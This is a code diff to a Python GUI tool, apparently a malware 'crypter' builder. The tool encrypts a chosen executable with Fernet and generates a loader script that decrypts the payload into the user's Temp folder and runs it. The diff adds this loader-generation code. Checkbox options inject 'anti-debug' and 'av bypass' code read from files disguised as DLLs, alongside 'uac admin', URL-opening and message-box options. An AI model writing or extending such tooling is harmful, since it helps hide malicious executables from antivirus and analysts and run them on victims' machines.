@@ -106,9 +106,8 @@ class GUI:
         self.urlEnter.configure(state="disabled")
         self.urlEnter.place(x= 293, y= 190)
 
-        self.urlVer = gui.IntVar(value=0)
-        urlButt = gui.CTkCheckBox(master=self.win, text = "open url", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'], variable= self.urlVer, command= self.SetUrl)
-        urlButt.place(x=293, y= 160)
+        self.urlButt = gui.CTkCheckBox(master=self.win, text = "open url", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'], command= self.SetUrl)
+        self.urlButt.place(x=293, y= 160)
 
 
         self.messageEnter = gui.CTkEntry(master=self.win,font=('Arial Rounded MT bold', 14), bg_color= ['#E5E5E5','#212121'], width= 200)
@@ -116,40 +115,39 @@ class GUI:
         self.messageEnter.configure(state="disabled")
         self.messageEnter.place(x= 293, y= 260)
 
-        self.messageVer = gui.IntVar(value=0)
-        messageButt = gui.CTkCheckBox(master=self.win, text = "open message", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'], variable= self.messageVer, command= self.SetMessage)
-        messageButt.place(x=293, y= 230)
+        self.messageButt = gui.CTkCheckBox(master=self.win, text = "open message", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'], command= self.SetMessage)
+        self.messageButt.place(x=293, y= 230)
 
-        self.uacVer = gui.IntVar(value=0)
-        uacButt = gui.CTkCheckBox(master=self.win, text = "uac admin", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'], variable= self.uacVer)
-        uacButt.place(x=293, y= 310)
+        self.uacButt = gui.CTkCheckBox(master=self.win, text = "uac admin", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'])
+        self.uacButt.place(x=293, y= 310)
 
-        self.debugVer = gui.IntVar(value=0)
-        debugButt = gui.CTkCheckBox(master=self.win, text = "anti-debug", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'], variable= self.debugVer)
-        debugButt.place(x=293, y= 350)
 
-        self.bypassVer = gui.IntVar(value=0)
-        bypassButt = gui.CTkCheckBox(master=self.win, text = "av bypass", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'], variable= self.bypassVer)
-        bypassButt.place(x=293, y= 390)
+        self.debugButt = gui.CTkCheckBox(master=self.win, text = "anti-debug", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'])
+        self.debugButt.place(x=293, y= 350)
 
-        start = gui.CTkButton(master = self.win, text= "obfuscate",font=('Arial Rounded MT bold', 24), corner_radius = 8, width= 200, command=self.ObfuscateWin)
+        self.bypassButt = gui.CTkCheckBox(master=self.win, text = "av bypass", font=('Arial Rounded MT bold', 18),bg_color= ['#E5E5E5','#212121'])
+        self.bypassButt.place(x=293, y= 390)
+
+        start = gui.CTkButton(master = self.win, text= "obfuscate",font=('Arial Rounded MT bold', 24), corner_radius = 8, width= 200, command=self.AsyncRun)
         start.place(x= 30, y= 394)
 
+    def AsyncRun(self):
+        async def ObfuscateWin():
+            self.frame = gui.CTkFrame(master=self.win, width=250, height=100, corner_radius= 25, border_width=2)
+            self.frame.place(relx= 0.5, rely= 0.5, anchor=CENTER)
 
-    def ObfuscateWin(self):
-        self.frame = gui.CTkFrame(master=self.win, width=250, height=100, corner_radius= 25, border_width=2)
-        self.frame.place(relx= 0.5, rely= 0.5, anchor=CENTER)
-
-        self.loadText = gui.StringVar(value='starting...')
-        self.header = gui.CTkLabel(master=self.win, textvariable = self.loadText, font=('Arial Rounded MT bold', 24),bg_color= ['#E5E5E5','#212121'])
-        self.header.place(relx= 0.5, rely= 0.45, anchor=CENTER)
+            self.loadText = gui.StringVar(value='starting...')
+            self.header = gui.CTkLabel(master=self.win, textvariable = self.loadText, font=('Arial Rounded MT bold', 24),bg_color= ['#E5E5E5','#212121'])
+            self.header.place(relx= 0.5, rely= 0.45, anchor=CENTER)
 
 
-        self.progressbar = gui.CTkProgressBar(master=self.win, orientation="horizontal")
-        self.progressbar.set(0)
-        self.progressbar.place(relx= 0.5, rely= 0.55, anchor=CENTER)
+            self.progressbar = gui.CTkProgressBar(master=self.win, orientation="horizontal")
+            self.progressbar.set(0)
+            self.progressbar.place(relx= 0.5, rely= 0.55, anchor=CENTER)
 
-        asyncio.run(self.Obfuscate())
+            await self.Obfuscate()
+        loop = asyncio.get_event_loop()
+        loop.run_until_complete(ObfuscateWin())
 
 
     async def Obfuscate(self):
@@ -160,33 +158,111 @@ class GUI:
             key = Fernet.generate_key()
             f = Fernet(key)
             self.progressbar.set(0.01)
+
             self.loadText.set('crypting...')
             with open(self.file, 'rb') as file:
                 file_data = file.read()
             encrypted_data = f.encrypt(file_data) 
-            new_name = f.encrypt(self.fileName.get())
-            #os.mr
-            with open(f"enc_{self.fileName.get()}", 'wb') as file:
+            new_name = f.encrypt(self.fileName.get().encode())
+            os.mkdir("cache")
+            with open(f"cache/enc_{self.fileName.get()}", 'wb') as file:
                 file.write(encrypted_data)
             self.progressbar.set(0.1)
-        except:
+
+            self.loadText.set('creating code...')
+            self.imports = '''from cryptography.fernet import Fernet
+import os, sys
+import subprocess
+'''
+            self.code = ''''''
+
+            self.progressbar.set(0.15)
+
+            if self.debugButt.get() == 1:
+                print("debug")
+                dll = open('dlls/vm_expro_.dll', 'r')
+                context = dll.read()
+                arr = context.split("x&x&x&x")
+                self.imports += arr[0]+'\n'
+                self.code = arr[1]+'\n'+self.code+"\nAntiDebug()\n"
+
+            self.progressbar.set(0.20)
+
+            if self.bypassButt.get() == 1:
+                print("bypass")
+                dll = open('dlls/vm_inpro_.dll', 'r')
+                context = dll.read()
+                arr = context.split("x&x&x&x")
+                self.imports += arr[0]+'\n'
+                self.code = arr[1]+'\n'+self.code+"\nAvByPass()\n"
+
+            self.progressbar.set(0.25)
+
+            if self.urlButt.get() == 1:
+                print("url")
+                self.imports += '\nimport webbrowser\n'
+                self.code = self.code+f"webbrowser.open('{self.urlEnter.get()}', new=2)\n\n"
+
+            self.progressbar.set(0.30)
+
+            if self.messageButt.get() == 1:
+                print("message")
+                self.imports +='\nfrom tkinter import messagebox\n'
+                self.code = self.code+f'messagebox.showinfo("Attention", f"{self.messageEnter.get()}")\n\n'
+            
+            self.progressbar.set(0.35)
+
+
+            context = rf'''key = {key}
+f = Fernet(key)
+
+name = f.decrypt({new_name}).decode()
+try:
+    base_path = sys._MEIPASS
+except Exception:
+    base_path = os.path.abspath(".")
+sa = os.path.join(base_path, "enc_" + name)
+
+
+ 
+with open(sa, 'rb') as file:
+    encrypted_data = file.read()
+
+decrypted_data = f.decrypt(encrypted_data)
+
+with open(r"C:\Users\\" + os.environ.get('USERNAME') + r"\AppData\Local\Temp\ceche_" + name, 'wb') as file:
+    file.write(decrypted_data)
+subprocess.call(r"C:\Users\\" + os.environ.get('USERNAME') + r"\AppData\Local\Temp\ceche_" + name)
+
+os._exit(0)
+            '''
+
+            self.code = self.imports+"\n"+self.code+'\n'+context
+            self.progressbar.set(0.40)
+
+            file = open(f'cache/{self.fileName.get()}.py','w')
+            file.write(self.code)
+            file.close()
+
+            self.progressbar.set(0.50)
+            
+        except Exception as e:
             self.progressbar.set(1)
             self.loadText.set("Error")
+            print(e)
             self.frame.after(3000,  self.frame.destroy)
             self.progressbar.after(3000,  self.progressbar.destroy)
             self.header.after(3000,  self.header.destroy)
 
 
-        self.fileContext = ''''''
-
     def SetMessage(self):
-        if self.messageVer.get() == 0:
+        if self.messageButt.get() == 0:
             self.messageEnter.configure(state="disabled")
         else:
             self.messageEnter.configure(state="normal")
 
     def SetUrl(self):
-        if self.urlVer.get() == 0:
+        if self.urlButt.get() == 0:
             self.urlEnter.configure(state="disabled")
         else:
             self.urlEnter.configure(state="normal")
